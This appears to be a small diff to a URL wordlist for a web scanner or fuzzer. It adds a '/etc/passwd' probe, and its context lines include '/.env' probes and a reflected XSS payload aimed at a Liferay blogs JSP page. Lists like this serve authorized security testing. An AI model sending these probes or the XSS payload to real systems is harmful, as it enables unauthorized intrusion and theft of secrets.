@@ -65,3 +65,4 @@
 /.env
 /.env/.
 /o/blogs-web/blogs/entry_cover_image_caption.jsp?coverImageURL=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/etc/passwd?raw??
